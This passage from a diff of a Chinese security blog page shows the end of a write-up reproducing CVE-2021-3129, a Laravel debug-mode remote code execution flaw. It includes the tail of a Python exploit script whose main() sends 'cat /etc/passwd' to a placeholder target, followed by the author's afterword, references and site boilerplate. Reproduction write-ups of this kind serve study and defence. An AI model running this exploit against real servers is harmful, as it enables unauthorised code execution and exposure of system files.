+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">self</span>.__vul_check()<span class="hljs-symbol">:</span>
+            print(<span class="hljs-string">&quot;[-] [%s] is seems not vulnerable.&quot;</span> % (<span class="hljs-keyword">self</span>.target))
+            print(<span class="hljs-string">&quot;[*] You can also call obj.exp() to force an attack.&quot;</span>)
+        <span class="hljs-symbol">else:</span>
+            <span class="hljs-keyword">self</span>.exp()
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>
+    Exp(<span class="hljs-string">&quot;http://xxx:8888&quot;</span>, <span class="hljs-string">&quot;cat /etc/passwd&quot;</span>)
+
+
+<span class="hljs-keyword">if</span> __name_<span class="hljs-number">_</span> == <span class="hljs-string">&#x27;__main__&#x27;</span><span class="hljs-symbol">:</span>
+    main()</code></pre>
+</blockquote>
+<h2 id="后记"><a class="header-anchor" href="#后记">🍭</a>后记</h2>
+<p>CVE-2021-3129分析复现太难了，坑点贼多，而且这个漏洞原作者都没声明，要疯狂找文章；不知道是不是好久没开kali（一个学期……💢💢💢），指令有点不熟悉，而且pip，docker-compose环境全乱了，搭环境就搭了好久，执行<code>docker-compose up -d</code>的时候一定要切到root权限，否则会疯狂报错💫💫💫，复现这个还得了解动态调试，phpstorm又不擅长，又跑去学……总之异常艰辛👻👻👻。</p>
+<h4 id="参考："><a class="header-anchor" href="#参考：">🍭</a>参考：</h4>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9165?page=1#toc-3">Laravel Debug RCE分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://anquan.baidu.com/article/1286">Laravel Debug模式下远程代码执行漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ambionics.io/blog/laravel-debug-rce">Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/12/filter/">
+                        <span class="hidden-mobile">Yii2 反序列化（CVE-2020-15148）分析</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
